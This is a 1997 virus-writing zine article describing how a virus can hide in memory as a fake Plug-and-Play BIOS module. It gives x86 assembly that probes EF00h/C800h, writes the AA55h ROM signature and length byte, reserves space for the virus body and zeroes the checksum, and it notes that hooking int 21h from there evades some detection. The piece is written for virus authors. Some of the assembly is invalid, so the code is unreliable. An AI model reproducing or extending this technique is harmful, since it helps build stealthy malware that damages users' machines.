
      ‹‹                  €
     ﬂﬂﬂ  Virus Magazine  € Box 176, Kiev 210, Ukraine      IV  1997
     ﬂ€€ ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ € ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ ﬂ ﬂﬂﬂﬂﬁﬂﬂﬂ  €ﬂﬂﬂﬂﬂﬂ€
      ﬁ€ €ﬂ‹ €ﬂﬂ ‹ﬂﬂ ‹ﬂﬂ ‹€‹ ‹ﬂﬂ €ﬂ€    › € ‹ﬂ€ € ‹ﬂﬂ €‹‹   € ﬂﬂﬂ€ €
       € € € €ﬂ  €ﬂ  €    €  €ﬂ  € €    € € € € € €   €     € ‹‹‹€ €
       € ﬁ ﬁ ﬁ   ﬁ‹‹ ﬁ‹‹  ﬁ  ﬁ‹‹ ﬁ‹ﬂ     ﬂ€ ﬂ‹€ ﬁ ﬁ‹‹ ﬁ‹‹‹  € €‹‹‹ €
       ﬁ ‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹ ‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹  €‹‹‹‹‹‹€
          (C) Copyright, 1994-97, by STEALTH group WorldWide, unLtd.
                              sgww@hotmail.com
            Digest of IV 8 - 11 russian, including Moscow issues


                    Wow! We're inside the BIOS! ;)

    Pentium & 486 computers have very useful thing - Plug 'n' Play BIOS.
Some people wanna create such BIOS for 386 - isn't it fun? ;) Well-known,
that this BIOS located at EF00-EFFF (about 16k memory). I think it is
enough memory for virus. The structure of the BIOS you can see below:

------------------------------------------------------------------------
 Offset         Length        Containing
               (in bytes)
+0              1              55h           ROM signature,
+1              1              AAh           used for BIOS = AA55h

+2              1             length         Length of ROM module
                                             (in 512b blocks)
+3              ?              ????          Executable code
------------------------------------------------------------------------

How can we detect if computer has this BIOS? For example, we can write
zero to the first byte, and then read it. If there's still zero, BIOS is
absent (now ;), if zero dissapeared - that fucking BIOS present.
Try another address, for example, C800h.

Here is procedure for PNP BIOS detection:
;==== cut here =======
; check for Plug'n'play bios
mov     ax,ef00h
mov     es,ax
xor     ax,ax
mov     es:[ax],ax
mov     ax,es:[ax]
cmp     ax,0
jz      pnpbios_no         ; Yeah! There's no BIOS!
jmp     pnpbios_yes        ; Uh :(
;
;
pnpbios_yes:
;
mov     ax,0c800h  ; Well, we'll try another address ;)
mov     es,ax
..
..

;
;
;If there's no BIOS, we gotta make it:

pnpbios_no:
mov     ax,0aa55h          ; now we are PNP BIOS
mov     es:[0],ax          ;
mov     ah,32              ;
mov     es:[2],ah          ;

Here we can write our "BIOS"
....virii code from es:[3] to es:[3fffh] ; here is our virus

;We need this procedure, 'cause BIOS CRC must be 0
mov     cx,3ffeh           ; count our CRC
xor     al,al              ; to make it 0

crc_loop:
        add     al,es:[cx]
        loop    crc_loop
        mov     ah,0
        sub     ah,al
        mov     es:[3fffh],ah
                          ;
; virii end
; here we can give control to program we started from ;)

;== cut here ===

Some programs can detect that "BIOS" hooks int 21h, but BIOS can
do many things ;)

                                        T0RmenT0R & Supervisor
                                          [Death Virii Crew]
                                          from Chaos Station BBS